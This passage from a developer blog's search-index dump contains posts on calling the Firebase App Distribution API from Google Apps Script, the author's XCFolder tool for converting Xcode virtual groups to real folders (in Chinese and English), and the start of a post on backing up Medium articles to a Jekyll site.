firebaseDistribution(releaseNote) { const url = \"https://firebaseappdistribution.googleapis.com/v1/\"+project+\"/releases?filter=releaseNotes.text%3D*\"+releaseNote+\"*\"; // Filter: https://firebase.google.com/docs/reference/app-distribution/rest/v1/projects.apps.releases/list?hl=zh-tw const headers = { \"Content-Type\": \"application/json; charset=UTF-8\", \"Authorization\": \"Bearer \" + ScriptApp.getOAuthToken(), // Directly use the current account to obtain the token }; const options = { \"method\": \"get\", \"headers\": headers }; const data = UrlFetchApp.fetch(url, options); const result = JSON.parse(data.getContentText()).releases; if (result == undefined) { return []; } return result;}[Firebase Project ID] and [Firebase APP ID] can be obtained from the Firebase project settings:After pasting the code, the first execution requires completing permission authorization. Click “Review Permissions” Select the account to execute, usually the current Google Apps Script account Choose “Advanced” to expand -&gt; Click “Go to XXX”This is an application we wrote for our own use, so it doesn’t need to go through Google verification. Click “Allow” The above screens may not appear; if they don’t, you can ignore them.After allowing, clicking “Debug” or “Run” will execute the program:If an error occurs:Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 403. Truncated server response: { \"error\": { \"code\": 403, \"message\": \"Request had insufficient authentication scopes.\", \"status\": \"PERMISSION_DENIED\", \"details\":... (use muteHttpExceptions option to examine full response)...orException: Specified permissions are not sufficient to call UrlFetchApp.fetch. Required permissions: https://www.googleapis.com/auth/script.external_requestPlease confirm that the oauthScopes in appsscript.json includes the following two configuration settings (refer to step 2):\"oauthScopes\": [ \"https://www.googleapis.com/auth/script.external_request\", \"https://www.googleapis.com/auth/cloud-platform\" ]If an error occurs:Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 401. Truncated server response: { \"error\": { \"code\": 401, \"message\": \"Request had invalid authentication credentials. Expected OAuth 2 access token, login cookie or othe... (use muteHttpExceptions option to examine full response)This indicates that the bound GCP project has not been set up (refer to step 1) or that the GCP project has not enabled the desired Google APIs, or that the current account does not have permissions for that GCP / Google APIs or lacks permissions for that Firebase App. Please check the settings.If an error occurs:Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 404. Truncated server response:orException: Request failed for https://firebaseappdistribution.googleapis.com returned code 400. Truncated server response: { \"error\": { \"code\": 400, \"message\": \"Request contains an invalid argument.\", \"status\": \"INVALID_ARGUMENT\" }}Please confirm whether the Google APIs request path is correct.Integration Successful 🎉🎉🎉You can see that with less than 10 lines of code, you can seamlessly integrate with Google APIs, which is really convenient. Friends interested can take a look at the relatively cumbersome steps for exchanging authentication tokens when implementing it yourself for Google APIs integration.Next Steps:Combine with the previous article “Using Google Apps Script Web App Forms to Connect to GitHub Action CI/CD” to link CI/CD tasks, presenting the Firebase App Distribution download link directly on the Web App for colleagues to download conveniently.Demo Result Other Google APIs can also be integrated in a similar manner.If you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 98 Total Views Last Statistics Date: 2025-08-15 | 87 Views on Medium." }, { "title": "XCode 虛擬目錄萬年問題探究與我的開源工具解決方案", "url": "/posts/zrealm-dev/xcode-%E8%99%9B%E6%93%AC%E7%9B%AE%E9%8C%84%E8%90%AC%E5%B9%B4%E5%95%8F%E9%A1%8C%E6%8E%A2%E7%A9%B6%E8%88%87%E6%88%91%E7%9A%84%E9%96%8B%E6%BA%90%E5%B7%A5%E5%85%B7%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-fd719053b376/", "categories": "ZRealm Dev.", "tags": "ios-app-development, xcode, swift, tuist, xcodegen", "date": "2025-03-02 20:21:31 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.XCode 虛擬目錄萬年問題探究與我的開源工具解決方案Apple 開發者職業傷害之 Xcode 早期使用虛擬目錄，導致目錄結構混亂且難以整合 XcodeGen, Tuist 等現代工具。Photo by Saad SalimE...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.XCode 虛擬目錄萬年問題探究與我的開源工具解決方案Apple 開發者職業傷害之 Xcode 早期使用虛擬目錄，導致目錄結構混亂且難以整合 XcodeGen, Tuist 等現代工具。Photo by Saad SalimEnglish version of this post:Exploring the Long-Standing Issues of XCode Virtual Directories and My Open Source Tool Solution背景隨著團隊規模與專案的成長，XCode 專案檔 ( .xcodeproj) 的體積會逐漸增大，依照專案複雜程度可以到十萬行、甚至百萬行，加上多人多條線並行開發，免不了會出現衝突問題； XcodeProj 檔案一旦出現衝突就跟 Storyboard / .xib 的衝突一樣難解 ，因也是純描述檔，很容易在解衝突時不小心把別人新增的檔案移除或是別人移除的檔案參照又跑回來。另外的問題是隨著模組化推進，在 XCode 專案檔 ( .xcodeproj) 建立、管理模組的流程非常不友善，模組有變動一樣只能從 XCode 專案檔 的 Diff 中查看，整體不利於團隊朝模組化邁進。 如果只是為了防止衝突可以簡單地在 pre-commit 做 File Sorting ，現有的腳本 Github 上很多，可以直接參考設置。XCFolder 長話短說 ，開發了一個工具可以幫你把 XCode 早期的虛擬目錄轉依照 XCode 裡的目錄結構換成實體目錄。 下滑繼續看故事…現代化 Xcode Project 檔案管理具體思維同我們在多人開發時不鼓勵使用 Storyboard or .xib 一樣， 我們需要一個好維護、可迭代、可被 Code Review 的介面來管理「XCode 專案檔」 ，目前市場主流有兩套免費工具可以使用： XCodeGen ：老牌工具，使用 YAML 定義 XCode 專案內容，再透過它轉換成 XCode 專案檔 ( .xcodeproj)。直接使用 YAML 定義結構、導入難度及學習成本較低、但是對模組化或是依賴管理功能較弱、YAML 動態設置弱。 Tuist ：近幾年出的新工具，使用 Swift DSL 定義 XCode 專案內容，再透過它轉換成 XCode 專案檔 ( .xcodeproj)。更穩定多變，內建模組化及依賴管理功能，但學習與導入門檻較高。不論是那一套我們的核心工作流程都會變成是： 建立 XCode 專案內容設定檔 (XCodeGen project.yaml or Tuist Project.swift ) 將 XCodeGen or Tuist 加入開發者與 CI/CD Server 環境中 使用 XCodeGen or Tuist 透過設定檔產生 .xcodeproj XCode 專案檔 /*.xcodeproj 目錄檔案 加入 .gitignore 調整開發者流程，切換 Branch 時需要跑 XCodeGen or Tuist 透過設定檔產生 .xcodeproj XCode 專案檔 調整 CI/CD 流程，需要跑 XCodeGen or Tuist 透過設定檔產生 .xcodeproj XCode 專案檔 完成.xcodeproj XCode 專案檔是由 XCodeGen or Tuist 基於 YAML of Swift DSL 設定檔產生的，同一份設定檔 &amp; 同個工具版本會產生相同結果；因此我們不需要再把 .xcodeproj XCode 專案檔上到 Git 當中，就此可以保證以後不會再有 .xcodeproj 檔案衝突；專案構建的改變、模組的新增改動我們都會回到定義的設定檔中做調整，因為是 Yaml or Swift 寫成的，我們可以很輕易地進行迭代跟 Code Review。Tuist Swift 範例： Project.swiftimport ProjectDescriptionlet project = Project( name: \"MyApp\", targets: [ Target( name: \"MyApp\", platform: .iOS, product: .app, bundleId: \"com.example.myapp\", deploymentTarget: .iOS(targetVersion: \"15.0\", devices: [.iphone, .ipad]), infoPlist: .default, sources: [\"Sources/**\"], resources: [\"Resources/**\"], dependencies: [] ), Target( name: \"MyAppTests\", platform: .iOS, product: .unitTests, bundleId: \"com.example.myapp.tests\", deploymentTarget: .iOS(targetVersion: \"15.0\", devices: [.iphone, .ipad]), infoPlist: .default, sources: [\"Tests/**\"], dependencies: [.target(name: \"MyApp\")] ) ])XCodeGen YAML 範例： project.yamlname: MyAppoptions: bundleIdPrefix: com.example deploymentTarget: iOS: '15.0'targets: MyApp: type: application platform: iOS sources: [Sources] resources: [Resources] info: path: Info.plist properties: UILaunchScreen: {} dependencies: - framework: Vendor/SomeFramework.framework - sdk: UIKit.framework - package: Alamofire MyAppTests: type: bundle.unit-test platform: iOS sources: [Tests] dependencies: - target: MyApp檔案目錄結構XCodeGen or Tuist 會依照檔案實際目錄、位置產生 XCode 專案檔 ( .xcodeproj) 的目錄結構， 實際目錄即為 XCode 專案檔案目錄 。因此檔案的實際目錄位置就很重要，我們會直接用它來當 XCode 專案檔案目錄。這在現代的 XCode / XCode 專案中，這兩個目錄的位置相等是再日常不過的事，但這個議題就是本文想要探究的項目。早期 Xcode 使用虛擬目錄在早期的 XCode 中在檔案目錄上按右鍵「New Group」是不會建立實際目錄的，檔案會被放在專案根目錄下並在 .xcodeproj XCode 專案檔做 File Reference，因此目錄只有在 XCode 專案檔中可見，實際沒有。隨著時代演變，Apple 在 XCode 上逐漸汰換了這個詭異的設計，後來的 XCode 從加上「New Group with Folder」到預設會建實體目錄、不要建要選「New Group without Folder」在到 現在 (XCode 16) 只剩「New Group」＋ 自動根據實體目錄產生XCode 專案檔案目錄 。虛擬目錄的問題 無法使用 XCodeGen or Tuist，因為都需要實體目錄位置產生 XCode 專案檔 ( .xcodeproj)。 Code Review 困難：在 Git Web GUI 上看不到目錄結構，整個檔案都是攤平的。 DevOps, 第三方工具整合困難：例如 Sentry, Github 可以依照目錄派發警告或 Auto-Assigner，沒有目錄只有檔案無法設定。 專案目錄結構極為複雜，一大堆檔案攤平在根目錄。 對於一個年代久遠並且沒有在早期意識到虛擬目錄問題的專案，虛擬目錄的檔案有 3,000+ 個，手動對照搬移的話搬完應該就辭職去賣狀元糕了，這真的可以稱得上是「 Apple 開發者職業傷害 😔 」。Xcode 專案虛擬目錄 轉 實體目錄基於上述種種原因，我們急迫的需要把 XCode 專案的虛擬目錄轉成實體目錄，否則後續的專案現代化、更高效的開發流程都無法推進。❌ Xcode 16 「Convert to folder」選項XCode 16去年 XCode 16 剛出時有關注到這個選單新選項，本來的期待是它可以自動幫我們把虛擬目錄檔案轉換成實體目錄。但實際並不然，他需要你先把檔案建好目錄、放到對應的實體位置，點擊「Convert to folder」後會幫你改成新的 XCode Project 目錄設定方式「 PBXFileSystemSynchronizedRootGroup 」，說實話 對轉換沒有任何用，這比較是轉換後可以升級成新的目錄設定方式。目錄沒有建立、檔案沒有放好，點「Convert to folder」就會報以下錯誤：Missing Associated FolderEach group must have an associated folder. The following groups are not associated with a folder:• xxxxUse the file inspector to associate a folder with each group, or delete the groups after moving their content to another group.🫥 開源專案 venmo / synx在 Github 搜尋許久只找到這個使用 Ruby 撰寫的虛擬轉實體目錄開源專案工具，實際跑下來是有效果的但因年久失修 (~= 10 年未更新) 很多檔案還是需要手動對應搬移，無法完全轉換，因此放棄。 不過還是很感謝這個開源專案的啟發，我才想說可以自己開發轉換工具。✅ 我的開源專案 ZhgChgLi / XCFolder使用純 Swift 開發的 Command Line Tools，基於 XcodeProj 解析 .xcodeproj XCode 專案檔，讀取所有檔案取得所屬目錄、解析目錄將虛擬目錄轉換成實體目錄，將檔案搬移到正確位置、最後再調整 .xcodeproj XCode 專案檔目錄設定，即可完成轉換。使用方式git clone https://github.com/ZhgChgLi/XCFolder.gitcd ./XCFolderswift run XCFolder YOUR_XCODEPROJ_FILE.xcodeproj ./Configuration.yamlFor Example:swift run XCFolder ./TestProject/DCDeviceTest.xcodeproj ./Configuration.yamlCI/CD 模式 ( Non Interactive Mode )：swift run XCFolder YOUR_XCODEPROJ_FILE.xcodeproj ./Configuration.yaml --is-non-interactive-modeConfiguration.yaml 可以設定想要的執行參數：# 忽略的目錄，不會解析轉換ignorePaths:- \"Pods\"- \"Frameworks\"- \"Products\"# 忽略的檔案類型，不會被轉換搬移ignoreFileTypes:- \"wrapper.framework\" # Frameworks- \"wrapper.pb-project\" # Xcode project files#- \"wrapper.application\" # Applications#- \"wrapper.cfbundle\" # Bundles#- \"wrapper.plug-in\" # Plug-ins#- \"wrapper.xpc-service\" # XPC services#- \"wrapper.xctest\" # XCTest bundles#- \"wrapper.app-extension\" # App extensions# 只建立目錄、搬移檔案，不調整 .xcodeproj XCode 專案檔目錄設定moveFileOnly: false# 優先使用 git mv 指令搬移檔案gitMove: true⚠️ 執行前請注意： 請確保 Git 無任何未 Commit 改變，因為怕腳本有誤污染你的專案目錄(腳本執行會檢查，若有未 Commit 改變會拋錯誤 ❌ Error: There are uncommitted changes in the repository ) 預設優先使用 git mv 指令搬移檔案以確保 git file log 紀錄完整，如果搬移失敗或是非 Git 專案才會使用 FileSystem Move 搬移檔案。等待執行完成即可：⚠️ 執行後請注意： 請檢查專案目錄是否有遺漏(紅色)的檔案，數量少可以手動修正，數量多請確認 Configuration.yaml 裡的 ignorePaths, ignoreFileTypes 設定是否正確，或是 建立一個 Issue 讓我知道。 檢查 Build Setting 裡的相關路徑 e.g. LIBRARY_SEARCH_PATHS 是否需要手動更動路徑 建議 Clean &amp; Build 看看 如果懶得管現在的 .xcodeproj XCode 專案檔，也可以直接開始使用 XCodeGen or Tuist 直接重新產生目錄檔案修改腳本：直接點擊 ./Package.swift 就能開啟專案調整腳本內容。其他開發隨記 得力於 XcodeProj 我們可以很輕易的使用 Swift 物件方式存取 .xcodeproj XCode 專案檔案內容 同樣使用 Clean Architecture 架構開發 PBXGroup 設定中若沒有 path 只有 name 則為虛擬目錄，反之則為實體目錄 XCode 16 新的目錄設定 PBXFileSystemSynchronizedRootGroup 只需宣告主目錄就會自動從實體目錄解析，不需要再把每個目錄跟檔案都宣告在 .xcodeproj XCode 專案檔案內 直接用 SPM (Package.swift) 方式開發 Command line tool 真的很方便！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 463 Total Views Last Statistics Date: 2025-08-15 | 459 Views on Medium." }, { "title": "Exploring the Long-Standing Issues of XCode Virtual Directories and My Open Source Tool Solution", "url": "/posts/exploring-the-long-standing-issues-of-xcode-virtual-directories-and-my-open-source-tool-solution-fd719053b376-en/", "categories": "", "tags": "ios-app-development, xcode, swift, tuist, xcodegen", "date": "2025-03-02 20:21:31 +0800", "snippet": "➡️➡️➡️ The post has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 15 Total Views", "content": "➡️➡️➡️ The post has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 15 Total Views" }, { "title": "Exploring the Long-Standing Issues of XCode Virtual Directories and My Open Source Tool Solution", "url": "/posts/zrealm-dev/en/exploring-the-long-standing-issues-of-xcode-virtual-directories-and-my-open-source-tool-solution-fd719053b376/", "categories": "ZRealm Dev.", "tags": "ios-app-development, xcode, swift, tuist, xcodegen", "date": "2025-03-02 20:21:31 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring the Long-Standing Issues of XCode Virtual Directories and My Open Source T...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring the Long-Standing Issues of XCode Virtual Directories and My Open Source Tool SolutionThe occupational hazards of Apple developers using virtual directories in Xcode early on, leading to chaotic directory structures and difficulties integrating modern tools like XcodeGen and Tuist.Photo by Saad SalimBackgroundAs the team size and project scale grow, the size of the XCode project file ( .xcodeproj) gradually increases. Depending on the complexity of the project, it can reach hundreds of thousands or even millions of lines. With multiple developers working in parallel, conflicts are inevitable; once a conflict occurs in the XcodeProj file, it is as difficult to resolve as conflicts in Storyboard / .xib files. Since it is also a purely descriptive file, it is easy to accidentally remove files added by others or have references to files removed by others reappear during conflict resolution.Another issue is that with the advancement of modularization, the process of creating and managing modules in the XCode project file ( .xcodeproj) is very unfriendly. When modules change, one can only view the changes through the Diff of the XCode project file, which is not conducive to the team’s move towards modularization. If the goal is simply to prevent conflicts, you can easily implement File Sorting in pre-commit. There are many existing scripts on GitHub that you can refer to for setup.XCFolder In short, I developed a tool that can help you convert the early virtual directories of XCode into physical directories according to the directory structure in XCode. Scroll down to continue the story…Modernizing Xcode Project File ManagementThe specific thinking is similar to our discouragement of using Storyboard or .xib during multi-developer projects; we need a well-maintained, iterative, and code-reviewable interface to manage the “XCode project file”. Currently, there are two mainstream free tools available in the market: XCodeGen: An established tool that uses YAML to define the contents of the XCode project and then converts it into an XCode project file ( .xcodeproj). It directly uses YAML to define the structure, has a lower difficulty and learning cost for introduction, but is weaker in modularization and dependency management functions, and has limited dynamic YAML settings. Tuist: A newer tool that uses Swift DSL to define the contents of the XCode project and then converts it into an XCode project file ( .xcodeproj). It is more stable and versatile, with built-in modularization and dependency management features, but has a higher learning and introduction threshold.Regardless of which set, our core workflow will be: Create XCode project configuration file (XCodeGen project.yaml or Tuist Project.swift) Add XCodeGen or Tuist to the developer and CI/CD Server environment Use XCodeGen or Tuist to generate the .xcodeproj XCode project file from the configuration file Add /*.xcodeproj directory files to .gitignore Adjust the developer workflow, requiring XCodeGen or Tuist to generate the .xcodeproj XCode project file from the configuration file when switching branches Adjust the CI/CD workflow, requiring XCodeGen or Tuist to generate the .xcodeproj XCode project file from the configuration file CompleteThe .xcodeproj XCode project file is generated by XCodeGen or Tuist based on the YAML or Swift DSL configuration file. The same configuration file and tool version will produce the same result; therefore, we do not need to upload the .xcodeproj XCode project file to Git, which ensures that there will be no more .xcodeproj file conflicts in the future. Changes in project builds and modifications to modules will be adjusted back in the defined configuration file. Since it is written in YAML or Swift, we can easily iterate and conduct code reviews.Tuist Swift Example: Project.swiftimport ProjectDescriptionlet project = Project( name: \"MyApp\", targets: [ Target( name: \"MyApp\", platform: .iOS, product: .app, bundleId: \"com.example.myapp\", deploymentTarget: .iOS(targetVersion: \"15.0\", devices: [.iphone, .ipad]), infoPlist: .default, sources: [\"Sources/**\"], resources: [\"Resources/**\"], dependencies: [] ), Target( name: \"MyAppTests\", platform: .iOS, product: .unitTests, bundleId: \"com.example.myapp.tests\", deploymentTarget: .iOS(targetVersion: \"15.0\", devices: [.iphone, .ipad]), infoPlist: .default, sources: [\"Tests/**\"], dependencies: [.target(name: \"MyApp\")] ) ])XCodeGen YAML Example: project.yamlname: MyAppoptions: bundleIdPrefix: com.example deploymentTarget: iOS: '15.0'targets: MyApp: type: application platform: iOS sources: [Sources] resources: [Resources] info: path: Info.plist properties: UILaunchScreen: {} dependencies: - framework: Vendor/SomeFramework.framework - sdk: UIKit.framework - package: Alamofire MyAppTests: type: bundle.unit-test platform: iOS sources: [Tests] dependencies: - target: MyAppFile Directory StructureXCodeGen or Tuist will generate the directory structure of the XCode project file ( .xcodeproj) based on the actual directory and location of the files, where the actual directory is the directory of the XCode project file.Therefore, the actual directory location of the files is very important, and we will directly use it as the directory for the XCode project file.In modern XCode / XCode projects, it is quite common for these two directory locations to be equal, but this is the topic that this article aims to explore.Early Xcode Used Virtual DirectoriesIn early versions of XCode, right-clicking on the file directory and selecting “New Group” would not create an actual directory; the files would be placed in the project root directory and referenced in the .xcodeproj XCode project file. Thus, the directory was only visible in the XCode project file and did not actually exist.As time evolved, Apple gradually phased out this peculiar design in XCode. Later versions of XCode introduced “New Group with Folder,” which by default would create a physical directory. To avoid creating one, you would need to select “New Group without Folder.” Now, in the current version (XCode 16), there is only “New Group” plus automatic generation of the XCode project file directory based on the actual directory.Issues with Virtual Directories Cannot use XCodeGen or Tuist, as both require the physical directory location to generate the XCode project file ( .xcodeproj). Code Review difficulties: The directory structure cannot be seen on the Git Web GUI; all files are flattened. DevOps and third-party tool integration difficulties: For example, Sentry and GitHub can issue alerts or Auto-Assigners based on directory structure; without directories, only files cannot be configured. The project directory structure is extremely complex, with a large number of files flattened in the root directory. For a project that is quite old and did not realize the issue of virtual directories early on, there are over 3,000 virtual directory files. If one were to manually map and move them, they would probably quit to sell rice cakes afterward; this can truly be called a “ Apple Developer Occupational Hazard 😔.”Converting Xcode Project Virtual Directories to Physical DirectoriesFor the reasons mentioned above, we urgently need to convert the virtual directories of the XCode project into physical directories; otherwise, subsequent project modernization and more efficient development processes cannot be advanced.❌ Xcode 16 “Convert to folder” OptionXCode 16When XCode 16 was first released last year, I noticed this new option in the menu. The initial expectation was that it could automatically convert virtual directory files into physical directories.However, this is not the case. It requires you to first create the directories and place the files in the corresponding physical locations. After clicking “Convert to folder,” it will change to the new XCode Project directory setting method “ PBXFileSystemSynchronizedRootGroup.” To be honest, this is not useful for conversion; it is more about upgrading to a new directory setting method after conversion.If the directories are not created and the files are not placed correctly, clicking “Convert to folder” will result in the following error:Missing Associated FolderEach group must have an associated folder. The following groups are not associated with a folder:• xxxxUse the file inspector to associate a folder with each group, or delete the groups after moving their content to another group.🫥 Open Source Projects venmo / synxAfter searching on GitHub for a long time, I only found this open-source tool written in Ruby for converting virtual directories to physical ones. It works effectively when run, but due to being outdated (approximately 10 years without updates), many files still need to be manually mapped and moved, making complete conversion impossible. Therefore, I gave up.&gt; _However, I am still very grateful for the inspiration from this open-source project, which led me to think about developing my own conversion tool._#### ✅ My Open Source Projects [ZhgChgLi](https://github.com/ZhgChgLi){:target=\"_blank\"} / [XCFolder](https://github.com/ZhgChgLi/XCFolder){:target=\"_blank\"}[![](https://repository-images.githubusercontent.com/941421589/27855f06-b938-4458-a20f-3e317b4283b7)](https://github.com/ZhgChgLi/XCFolder){:target=\"_blank\"}Developed using pure Swift, this Command Line Tool is based on [XcodeProj](https://github.com/tuist/XcodeProj){:target=\"_blank\"} to parse `.xcodeproj` Xcode project files, read all files to obtain their directories, parse the directories to convert virtual directories into physical ones, move the files to the correct locations, and finally adjust the directory settings in the `.xcodeproj` Xcode project file to complete the conversion.![](/assets/fd719053b376/1*eFNN12WDaAk6mr49OzmC_g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjQ4NCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }**Usage**```bashgit clone https://github.com/ZhgChgLi/XCFolder.gitcd ./XCFolderswift run XCFolder YOUR_XCODEPROJ_FILE.xcodeproj ./Configuration.yamlFor Example:swift run XCFolder ./TestProject/DCDeviceTest.xcodeproj ./Configuration.yamlCI/CD Mode ( Non Interactive Mode )：swift run XCFolder YOUR_XCODEPROJ_FILE.xcodeproj ./Configuration.yaml --is-non-interactive-modeConfiguration.yaml can be used to set the desired execution parameters:# Directories to ignore, will not be parsed or convertedignorePaths:- \"Pods\"- \"Frameworks\"- \"Products\"# File types to ignore, will not be converted or movedignoreFileTypes:- \"wrapper.framework\" # Frameworks- \"wrapper.pb-project\" # Xcode project files#- \"wrapper.application\" # Applications#- \"wrapper.cfbundle\" # Bundles#- \"wrapper.plug-in\" # Plug-ins#- \"wrapper.xpc-service\" # XPC services#- \"wrapper.xctest\" # XCTest bundles#- \"wrapper.app-extension\" # App extensions# Only create directories and move files, do not adjust .xcodeproj Xcode project file directory settingsmoveFileOnly: false# Prefer using git mv command to move filesgitMove: true⚠️ Please note before executing: Ensure that Git has no uncommitted changes, as the script may corrupt your project directory if there are issues.(The script will check, and if there are uncommitted changes, it will throw an error ❌ Error: There are uncommitted changes in the repository.) By default, it prefers to use the git mv command to move files to ensure complete git file log records. If the move fails or if it is not a Git project, it will use FileSystem Move to move the files.Just wait for the execution to complete:```⚠️ Please note after execution: Please check if there are any missing (red) files in the project directory. If there are few, you can manually fix them; if there are many, please confirm whether the settings for ignorePaths and ignoreFileTypes in Configuration.yaml are correct, or create an Issue to let me know. Check if the relevant paths in Build Settings, e.g., LIBRARY_SEARCH_PATHS, need to be manually changed. It is recommended to Clean &amp; Build to see the results. If you don’t want to deal with the current .xcodeproj XCode project file, you can also directly start using XCodeGen or Tuist to regenerate the directory files.Modify Script:You can directly click ./Package.swift to open the project and adjust the script content.Other Development Notes Thanks to XcodeProj, we can easily access the contents of the .xcodeproj XCode project file using Swift objects. Developed using the Clean Architecture structure. If there is no path in the PBXGroup settings and only a name, it is a virtual directory; otherwise, it is a physical directory. The new directory setting PBXFileSystemSynchronizedRootGroup in XCode 16 only requires declaring the main directory, and it will automatically resolve from the physical directory without needing to declare every directory and file in the .xcodeproj XCode project file. Developing command line tools directly using SPM (Package.swift) is really convenient!If you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 463 Total Views Last Statistics Date: 2025-08-15 | 459 Views on Medium." }, { "title": "自動備份 Medium 文章到 Github Pages (Jekyll) 的那些事", "url": "/posts/zrealm-dev/%E8%87%AA%E5%8B%95%E5%82%99%E4%BB%BD-medium-%E6%96%87%E7%AB%A0%E5%88%B0-github-pages-jekyll-%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B-5bb7d3a4954f/", "categories": "ZRealm Dev.", "tags": "medium, jekyll, automation, ios-app-development, github-pages", "date": "2025-01-18 23:12:33 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.自動備份 Medium 文章到 Github Pages (Jekyll) 的那些事個人 Medium 文章備份鏡像站搭建、維護、升級、客製化的一些紀錄前言經營 Medium 來到了第 6 年，文章總數在去年突破 100 篇；...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.自動備份 Medium 文章到 Github Pages (Jekyll) 的那些事個人 Medium 文章備份鏡像站搭建、維護、升級、客製化的一些紀錄前言經營 Medium 來到了第 6 年，文章總數在去年突破 100 篇；隨著經營時間越長、文章越多，越怕哪天 Medium 突然關閉或是帳號異常造成所有文章心血付之一炬，有的文章含金量不高道無妨，但更多的是記錄技術架構跟當時的解題思維，我時常也會回來看之前寫的文章，重新複習知識；另外後面幾年也開始記錄出國旅遊遊記，都是回憶並且流量表現不錯；這些內容一但遺失就不可能再重新撰寫了。自行開發備份工具我習慣都是直接在 Medium 平台上撰寫文章，沒有自己的備份，因此在 2022 年過年期間花時間開發了一個 Medium 文章下載＆轉換成 Markdown 文件(包含文章圖片、文章內嵌的程式碼…等內容) 的工具 — ZMediumToMarkdown ：並延伸使用此工具將下載下來的 Markdown 使用 Jekyll (Chirpy Theme) 做為靜態備份鏡像網站部署在 Github Pages 上 — https://zhgchg.li/https://zhgchg.li/那時候把這整套整合成一個 Github Template Repo 給有同樣需求的朋友可以快速部署使用 — ZMediumToJekyll ，在此之後(2022)，我就沒有再更新過 Jekyll (Chirpy Theme) 的版本跟設定了； ZMediumToMarkdown 持續有在維護，偶爾會發現格式解析錯誤就會立刻修正，目前趨於穩定。那時候使用的 Jekyll (Chirpy Theme) 版本是 v5.x 沒有太大的問題，該有的功能也都有(e.g. 置頂、分類、標籤、封面圖、留言…)；只有在畫面滾動時很常會出現無法滾動問題，但是在滑個幾下又正常，一個操作體驗缺憾，曾經嘗試升級到 v6.x 還是有、回報給官方也沒得到回應；再加上隨著版本提升升級會遇到的衝突就越多，因此後來完全放棄升級這個念頭。近期才下定決心要解決 Jekyll (Chirpy Theme) 問題、升級版本、順手重新優化快速部署工具 ZMediumToJekyll 。New! medium-to-jekyll-starter 🎉🎉medium-to-jekyll-starter.github.io我將 Jekyll (Chirpy Theme) 最新版 v7.x 加上我的 ZMediumToMarkdown Medium 文章下載轉換工具重新整合成新的 — medium-to-jekyll-starter.github.io Github Template Repo。大家可以直接使用這個範本 Repo 快速設定搭建自己的 Medium 鏡像內容備份網站， 一次設定永久持續自動備份、部署在 Github Pages 上完全免費 。 手把手設定教學請參考此篇文章： https://zhgchg.li/posts/medium-to-jekyll/成果https://zhgchg.li/ *上面的所有文章都是 自動 從我的 Medium 下載所有內容＆轉換成 Markdown 格式＆重新上傳。 附上隨便一篇文章的轉換成果作為比較範例： Medium 上的原始內容 / 轉換後在個人網站的結果升級後沒再出現滾動卡住的問題了，藉由這次升級也多加上了客製化動態內容 (顯示 Medium 追蹤人數)。一些技術紀錄Jekyll (Chirpy Theme) 在 Github Pages 上的部署設定方式主要是直接參考官方 Start Repo： 上個月也參考這個專案的方式，做了一個新的開源專案 — Linkyee 開源版的 Link Tree 個人連結頁面。https://link.zhgchg.li/Jekyll 客製化方式 (1) — Override HTMLJekyll 是一套很強大的 Ruby 靜態內容網站生成引擎， Jekyll (Chirpy Theme) 只是一套基於 Jekyll 的主題，比較過其他主題還是 Chirpy Theme 最有質感跟操作體驗優異、功能俱全。Jekyll 的頁面具有繼承性，我們可以在 ./_layouts 新增 與 Jekyll 相同的頁面檔案名 ，引擎在產生網站內容時就會使用你自訂的頁面內容取代掉原本的。例如我希望在每個文章頁末尾加上一行文字，我先把原本的文章頁面檔案( post.html )複製出來，放到 ./_layouts 目錄下：使用編輯器打開 post.html 在相應的位置加上文字或客製化，重新部署網站就能看到客製化結果。也可以建立一個 ./_include 目錄，放一些想要共用的頁面內容檔案：然後再 post.html 中我們就可以直接使用 {% include buymeacoffee.html %} 引入剛檔案的 HTML 內容重複使用。 複寫 HTML Layout 檔案的優點是 100% 客製化，頁面內容、排版要怎麼呈現都可以隨意調整；缺點是這次在升級的過程就會遇到衝突或是預期外結果，要自己重新檢視一次客製化的內容。Jekyll 客製化方式 (2) — Plugin第二種方式是使用 Plugin 中的 Hook 方法，在 Jekyll 產生靜態內容階段注入自己想要的客製化內容。Built-in Hook Owners and EventsHook 事件 有很多，這邊只附上我用到的 site:pre_render 跟 post:pre_render新增方式也很簡單，只要在 ./_plugins 新增一個 Ruby 檔案即可。posts-lastmod-hook.rb 是原本就有的 Plugin我想要幾個「偽」動態內容功能，第一個是在個人資料下顯示 Medium 追蹤人數還有在頁底顯示頁面內容最後更新時間。在 ./_plugins 下建立了一個 zhgchgli-customize.rb ：#!/usr/bin/env ruby#require 'net/http'require 'nokogiri'require 'uri'require 'date'def load_medium_followers(url, limit = 10) return 0 if limit.zero? uri = URI(url) response = Net::HTTP.get_response(uri) case response when Net::HTTPSuccess then document = 